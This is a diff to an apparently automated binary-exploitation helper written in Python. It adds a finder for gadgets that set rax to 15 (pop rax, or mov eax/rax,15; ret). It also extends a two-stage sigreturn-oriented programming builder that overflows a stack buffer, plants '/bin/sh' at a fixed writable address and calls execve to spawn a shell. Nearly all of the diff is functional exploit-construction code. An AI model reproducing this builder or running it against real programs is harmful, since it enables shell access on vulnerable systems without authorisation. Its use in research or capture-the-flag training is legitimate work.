@@ -169,6 +169,23 @@ def find_pop_rax(data: bytes):
     return _find_exec(data, _POP_RAX)
 
 
+_MOV_EAX_15 = b"\xb8\x0f\x00\x00\x00\xc3"           # mov eax, 15 ; ret
+_MOV_RAX_15 = b"\x48\xc7\xc0\x0f\x00\x00\x00\xc3"   # mov rax, 15 ; ret
+
+
+def find_rax15(data: bytes):
+    """A gadget that puts 15 (rt_sigreturn) into rax for SROP, as (vaddr, kind): `pop rax;ret`
+    (kind 'pop' -- the 15 is the NEXT stack word) or `mov eax/rax,15;ret` (kind 'mov' -- no stack
+    word). Generalises the SROP bootstrap beyond `pop rax`, which some no-pop-rax binaries lack."""
+    a = find_pop_rax(data)
+    if a:
+        return (a, "pop")
+    a = _find_exec(data, _MOV_EAX_15) or _find_exec(data, _MOV_RAX_15)
+    if a:
+        return (a, "mov")
+    return None
+
+
 def find_writable(data: bytes, need: int = 16):
     """(vaddr, size) of a SAFE fixed writable address to plant bytes on a no-PIE target: an address
     in the .bss (the uninitialized tail of a writable PT_LOAD, past p_filesz) rather than the
@@ -219,6 +236,7 @@ def srop_feasible(data: bytes):
     return {
         "syscall": find_syscall(data),
         "pop_rax": find_pop_rax(data),
+        "rax15": find_rax15(data),                      # (addr, 'pop'|'mov') -- generalises pop_rax
         "writable": find_writable(data),
         "binsh": find_string(data, b"/bin/sh"),
     }
@@ -239,22 +257,27 @@ def build_srop_execve(offset: int, *, syscall: int, binsh: int, length: int,
     return bytes(body)
 
 
-def build_srop_execve_plant(offset: int, *, syscall: int, pop_rax: int, writable: int,
+def build_srop_execve_plant(offset: int, *, syscall: int, rax15, writable: int,
                             count: int = 0x200, binsh_off: int = 0x120):
-    """Two-STAGE SROP execve for a binary that has a writable segment and a `pop rax` gadget but NO
+    """Two-STAGE SROP execve for a binary that has a writable segment and a rax=15 gadget but NO
     "/bin/sh" string in the image: PLANT the string via a read, then execve it. No leak needed on a
-    no-PIE target because `writable` is a fixed address.
+    no-PIE target because `writable` is a fixed address. `rax15` is (vaddr, kind) from find_rax15:
+    a `pop rax;ret` (the 15 follows on the stack) or a `mov eax/rax,15;ret` (no stack word).
 
-      stage1 (to the overflowing read): pad(offset) -> pop rax;15 -> syscall(rt_sigreturn) ->
+      stage1 (to the overflowing read): pad(offset) -> set rax=15 -> syscall(rt_sigreturn) ->
         frame{rax=0(read), rdi=0, rsi=writable, rdx=count, rip=syscall, rsp=writable}
         -- so after the read the `ret` pivots rsp INTO the freshly-read stage2.
-      stage2 (to that read): pop rax;15 -> syscall(rt_sigreturn) ->
+      stage2 (to that read): set rax=15 -> syscall(rt_sigreturn) ->
         frame{rax=59(execve), rdi=writable+binsh_off, rip=syscall} ... "/bin/sh\\0" at +binsh_off.
 
     Returns (stage1, stage2): send stage1 to the overflow, then stage2 to the planted read.
     """
-    def _set_rax15():                                # pop rax;15; then the syscall gadget
-        return struct.pack("<Q", pop_rax) + struct.pack("<Q", 15) + struct.pack("<Q", syscall)
+    gaddr, kind = rax15
+
+    def _set_rax15():                                # put 15 in rax, then the syscall gadget
+        if kind == "pop":                            # pop rax; ret -- 15 is the next stack word
+            return struct.pack("<Q", gaddr) + struct.pack("<Q", 15) + struct.pack("<Q", syscall)
+        return struct.pack("<Q", gaddr) + struct.pack("<Q", syscall)   # mov eax,15;ret -- no word
     binsh = writable + binsh_off
     stage2 = _set_rax15() + sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0,
                                             rsp=writable)
